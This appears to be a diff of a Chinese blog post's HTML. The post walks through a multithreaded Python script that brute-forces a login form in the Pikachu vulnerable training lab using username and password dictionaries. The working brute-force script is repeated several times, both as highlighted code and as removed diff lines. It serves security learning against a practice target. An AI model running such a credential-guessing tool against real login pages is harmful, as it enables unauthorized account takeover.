DEBUG</span></span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储成功的结果</span></span><br><span class="line">success_results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制参数</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=timeout)</span><br><span class="line">        logger.info(<span class="string">f&quot;响应状态码：<span class="subst">&#123;response.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            success_results.append(<span class="string">f&quot;[+]爆破成功：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(success_results[-<span class="number">1</span>])  <span class="comment"># 记录成功的日志信息</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.info(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>, 测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i, j, url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出成功的结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成功的结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> success_results:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br></pre></td></tr></table></figure>
 
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-# 配置日志记录
-logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-logger = logging.getLogger(__name__)
-
-# 创建文件处理程序
-current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())
-log_file_name = f&quot;&#123;current_time&#125;.txt&quot;
-file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)
-file_handler.setLevel(logging.DEBUG)  # 设置日志级别为 DEBUG
-file_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-file_handler.setFormatter(file_formatter)
-logger.addHandler(file_handler)
-
-# 用于存储成功的结果
-success_results = []
-
-
-# 文件读取
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
-
-
-# 控制参数
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-timeout = args.timeout
-
-
-# 探活
-def check(url, timeout):
-    try:
-        response = requests.get(url, timeout=timeout)
-        logger.info(f&quot;响应状态码：&#123;response.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-        return response.status_code
-    except requests.exceptions.RequestException as e:
-        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)
-        return
-
-
-# 主函数
-def run(username, password, url):
-    try:
-        data = &#123;
-            &quot;username&quot;: username,
-            &quot;password&quot;: password,
-            &quot;submit&quot;: &quot;Login&quot;
-        &#125;
-        r = requests.post(url, data=data)
-        if &quot;success&quot; in r.text:
-            success_results.append(f&quot;[+]爆破成功：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)
-            logger.info(success_results[-1])  # 记录成功的日志信息
-        # else:
-        #     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)
-    except requests.exceptions.RequestException as e:
-        logger.info(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;, 测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)
-
-
-# 多线程
-def multi_thread(username, password, url, timeout):
-    if check(url, timeout) != 200:
-        return
-
-    threads = []
-    for i in username:
-        for j in password:
-            threads.append(threading.Thread(target=run, args=(i, j, url,)))
-
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
-
-    logger.info(&quot;运行结束&quot;)
-
-    # 输出成功的结果
-    print(&quot;成功的结果:&quot;)
-    for result in success_results:
-        print(result)
-
-
-if __name__ == &quot;__main__&quot;:
-    multi_thread(username, password, url, timeout)
-</code></pre>
 <p><img src="/../image/image-20240720215502439.png" alt="image-20240720215502439"></p>
 <p>但还是感觉信息有点不是我想要的，再次调试后，终极版来了</p>
-<pre><code class="python">import requests
-import argparse
-import threading
-import time
-import logging
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.DEBUG)  <span class="comment"># 设置日志级别为 DEBUG</span></span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储成功的结果</span></span><br><span class="line">success_results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制参数</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=timeout)</span><br><span class="line">        logger.info(<span class="string">f&quot;响应状态码：<span class="subst">&#123;response.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            success_results.append(<span class="string">f&quot;[+]爆破成功：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(success_results[-<span class="number">1</span>])  <span class="comment"># 记录成功的日志信息</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.info(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>, 测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i, j, url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出成功的结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成功的结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> success_results:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br></pre></td></tr></table></figure>
 
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-# 配置日志记录
-logging.basicConfig(level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-logger = logging.getLogger(__name__)
-
-# 创建文件处理程序
-current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())
-log_file_name = f&quot;&#123;current_time&#125;.txt&quot;
-file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)
-file_handler.setLevel(logging.DEBUG)  # 设置日志级别为 DEBUG
-file_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-file_handler.setFormatter(file_formatter)
-logger.addHandler(file_handler)
-
-# 用于存储成功的结果
-success_results = []
-
-
-# 文件读取
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
-
-
-# 控制参数
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-timeout = args.timeout
-
-
-# 探活
-def check(url, timeout):
-    try:
-        response = requests.get(url, timeout=timeout)
-        logger.info(f&quot;响应状态码：&#123;response.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-        return response.status_code
-    except requests.exceptions.RequestException as e:
-        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)
-        return
-
-
-# 主函数
-def run(username, password, url):
-    try:
-        data = &#123;
-            &quot;username&quot;: username,
-            &quot;password&quot;: password,
-            &quot;submit&quot;: &quot;Login&quot;
-        &#125;
-        r = requests.post(url, data=data)
-        if &quot;success&quot; in r.text:
-            success_results.append(f&quot;[+]爆破成功：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)
-            logger.info(success_results[-1])  # 记录成功的日志信息
-        # else:
-        #     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)
-    except requests.exceptions.RequestException as e:
-        logger.info(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;, 测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)
-
-
-# 多线程
-def multi_thread(username, password, url, timeout):
-    if check(url, timeout) != 200:
-        return
-
-    threads = []
-    for i in username:
-        for j in password:
-            threads.append(threading.Thread(target=run, args=(i, j, url,)))
-
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
-
-    logger.info(&quot;运行结束&quot;)
-
-    # 输出成功的结果
-    print(&quot;成功的结果:&quot;)
-    for result in success_results:
-        print(result)
-
-
-if __name__ == &quot;__main__&quot;:
-    multi_thread(username, password, url, timeout)
-</code></pre>
 <p><img src="/../image/image-20240720220123972.png" alt="image-20240720220123972"></p>
 <p>可以看到终极版的输出，有成功和请求失败的，对于多线程导致的请求失败的结果哦我们可以单独再测试一次。。。吃了不会多线程的苦，检查下日志</p>
 <p><img src="/../image/image-20240720220335586.png" alt="image-20240720220335586"></p>
